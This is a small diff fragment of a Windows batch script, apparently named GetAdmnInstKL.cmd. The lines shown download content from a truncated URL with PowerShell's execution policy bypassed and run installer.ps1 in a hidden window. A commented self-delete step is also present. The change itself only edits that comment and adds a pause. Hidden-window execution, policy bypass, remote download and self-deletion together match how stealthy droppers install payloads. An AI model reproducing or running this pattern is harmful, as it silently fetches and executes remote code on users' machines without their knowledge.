@@ -44,4 +44,5 @@ powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri 'https://raw
 powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
 
 @REM self delete
-@REM del GetAdmnInstKL.cmd
+@REM del GetAdmnInstKL.cmd'
+pause
